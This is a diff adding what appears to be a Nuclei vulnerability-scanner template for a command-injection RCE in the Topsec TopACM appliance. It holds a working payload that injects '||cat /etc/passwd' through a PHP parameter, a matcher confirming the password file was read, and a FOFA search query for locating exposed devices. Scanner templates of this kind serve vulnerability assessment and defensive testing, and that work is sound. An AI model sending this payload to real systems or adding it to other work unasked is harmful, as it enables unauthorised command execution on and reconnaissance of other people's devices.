@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code_1 == 200 && contains((body), 'root:/root:')
+          type: dsl
+      method: GET
+      path:
+        - '{{RootURL}}/view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20/etc/passwd'
+id: topsec-topacm-nabortable-static-convert-rce
+info:
+    author: xy
+    description: 天融信上网行为管理rce
+    metadata:
+        fofa-query: title=="Login @ Reporter" && body="天融信"
+        max-request: 2
+        verified: true
+    name: 天融信上网行为管理rce
+    reference:
+        - https://mp.weixin.qq.com/s/yvRJFErp0a-VtU0UCLAGVQ
+    severity: critical
+    tags:
+        - topsec
+        - topacm
+        - iot
+        - 天融信上网行为管理
+        - opac
